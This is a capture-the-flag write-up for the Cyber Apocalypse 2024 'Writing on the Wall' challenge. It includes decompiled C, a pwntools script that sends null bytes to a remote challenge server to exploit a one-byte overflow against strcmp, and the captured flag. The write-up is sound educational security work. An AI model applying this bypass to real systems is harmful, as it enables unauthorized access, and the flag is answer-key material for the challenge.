# Cyber Apocalypse 2024

## Writing on the Wall

> As you approach a password-protected door, a sense of uncertainty envelops you—no clues, no hints. Yet, just as confusion takes hold, your gaze locks onto cryptic markings adorning the nearby wall. Could this be the elusive password, waiting to unveil the door's secrets?
> 
> Author: w3th4nds
> 
> [`pwn_writing_on_the_wall.zip`](pwn_writing_on_the_wall.zip)

Tags: _pwn_

## Solution
The challenge comes with a binary we decompile with `Ghidra`. The main has a small buffer that contains the string `w3tpass `, reads some user input and compares the content of the buffer with the user input. If both are the same the flag is shown.

The only problem is that our input buffer is only 6 bytes wide and the `password` is 7 bytes wide (note the space at the end). Luckily we have a one byte buffer overflow and even better, this one byte is the first byte of the password buffer. Therefore sending 7 null bytes will cause the string compare to succeed, as `strcmp` relys on c-strings which use a null-byte for string termination. The compare compares therefore two empty strings and decides they must be the same and giving us eventually the flag.

```c
undefined8 main(void)
{
  long lVar1;
  int iVar2;
  long in_FS_OFFSET;
  char local_1e [6];
  char local_18 [8];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  local_18[0] = 'w';
  local_18[1] = '3';
  local_18[2] = 't';
  local_18[3] = 'p';
  local_18[4] = 'a';
  local_18[5] = 's';
  local_18[6] = 's';
  local_18[7] = ' ';
  read(0,local_1e,7);
  iVar2 = strcmp(local_1e,local_18);
  if (iVar2 == 0) {
    open_door();
  }
  else {
    error("You activated the alarm! Troops are coming your way, RUN!\n");
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

```python
from pwn import *

p = remote("94.237.62.252", 34784)
p.sendline(b"\x00"*7)
p.interactive()
```

Flag `HTB{3v3ryth1ng_15_r34d4bl3}`